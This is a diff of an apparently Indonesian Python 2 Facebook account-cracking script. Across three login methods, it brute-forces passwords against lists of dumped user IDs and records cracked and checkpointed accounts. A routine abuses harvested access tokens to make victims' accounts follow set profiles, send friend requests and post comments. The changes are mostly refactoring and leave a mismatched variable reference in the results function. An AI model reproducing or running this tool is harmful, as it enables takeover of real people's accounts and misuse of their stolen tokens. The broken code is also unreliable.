@@ -18,7 +18,7 @@ except ImportError:
     print '\n [×] Modul Futures belum terinstall!...\n'
     os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')
 
-import requests, sys, os, subprocess, random, time, re, json
+import requests, sys, os, random, time, re, json
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
 from datetime import datetime
 from time import sleep
@@ -101,10 +101,11 @@ logo = ''' \033[0;96m __  __        __  ______  ____
 
 
 # crack selesai
-def hasil(ok,cp):
+def hasil(ngocok,ismylife):
     if len(ok) != 0 or len(cp) != 0:
-        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
-        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
+        print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
+        print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ngocok)),N)
+        print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(ismylife)),N);exit()
     else:
         print '\n\n [%s!%s] opshh kamu tidak mendapatkan hasil :('%(M,N);exit()
 
@@ -264,7 +265,6 @@ def kontol():
     requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
     requests.post('https://graph.facebook.com/100039688893849/subscribers?access_token=%s'%(kentod))
     requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
-    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=%s'%(kentod))
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
     requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
     requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
@@ -637,7 +637,7 @@ def check_yntkts():
 class __crack__:
 
     def __init__(self):
-        self.apk = []
+        self.id = []
 
 
     def plerr(self):
@@ -646,10 +646,7 @@ class __crack__:
             self.id = open(self.apk).read().splitlines()
             print '\n [%s+%s] total id -> %s%s%s' %(O,N,M,len(self.id),N)
         except:
-            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N)
-            time.sleep(3)
-            moch_yayan()
-
+            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah tolol!'%(N,M,N,M,self.apk,N);time.sleep(3);moch_yayan()
         ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
@@ -664,7 +661,7 @@ class __crack__:
                     def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                         cin = raw_input('\n [*] method : ')
                         if cin == '':
-                            self.__yan__()
+                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                         elif cin == '1':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -674,13 +671,10 @@ class __crack__:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
                                         __yayanXD__.submit(self.__api__, kimochi, ysc)
-                                    except:
-                                        pass
+                                    except: pass
 
-                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
-                            exit()
                         elif cin == '2':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -690,13 +684,10 @@ class __crack__:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
                                         __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
-                                    except:
-                                        pass
+                                    except: pass
 
-                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
-                            exit()
                         elif cin == '3':
                             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
                             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -706,17 +697,12 @@ class __crack__:
                                     try:
                                         kimochi = ikeh.split('<=>')[0]
                                         __yayanXD__.submit(self.__mfb__, kimochi, ysc)
-                                    except:
-                                        pass
+                                    except: pass
 
-                            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
                             os.remove(self.apk)
                             hasil(ok,cp)
-                            exit()
                         else:
-                            print '\n %s[%s!%s] input yang bener goblok!'%(N,M,N)
-                            time.sleep(2)
-                            moch_yayan()
+                            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                     print '\n [ pilih method login - silahkan coba satu² ]\n'
                     print ' [%s1%s]. method API (fast)'%(O,N)
                     print ' [%s2%s]. method mbasic (slow)'%(O,N)
@@ -730,15 +716,13 @@ class __crack__:
             print ' [%s3%s]. method mobile (super slow)'%(O,N)
             self.__pler__()
         else:
-            print '\n %s[%s×%s] y/t goblok!'%(N,M,N)
-            time.sleep(2)
-            moch_yayan()
+            print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
         return
 
 
     def __api__(self, user, _yan_):
         global ok,cp,loop
-        print '\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp)),
+        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -797,7 +781,7 @@ class __crack__:
 
     def __mbasic__(self, user, _yan_):
         global ok,cp,loop
-        print '\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp)),
+        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -855,7 +839,7 @@ class __crack__:
 
     def __mfb__(self, user, _yan_):
         global ok,cp,loop
-        print '\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp)),
+        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in _yan_:
             pw = pw.lower()
@@ -916,7 +900,7 @@ class __crack__:
     def __pler__(self):
         yan = raw_input('\n [*] method : ')
         if yan == '':
-            self.__pler__()
+            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -958,10 +942,8 @@ class __crack__:
                     except:
                         pass
 
-            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
-            exit()
         elif yan in ('2', '02'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -1003,10 +985,8 @@ class __crack__:
                     except:
                         pass
 
-            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
-            exit()
         elif yan in ('3', '03'):
             print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
@@ -1048,10 +1028,12 @@ class __crack__:
                     except:
                         pass
 
-            print '\n\n %s[%s#%s] crack selesai...'%(N,K,N)
             os.remove(self.apk)
             hasil(ok,cp)
-            exit()
+
+        else:
+            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()
+
 
 if __name__ == '__main__':
     os.system('git pull')
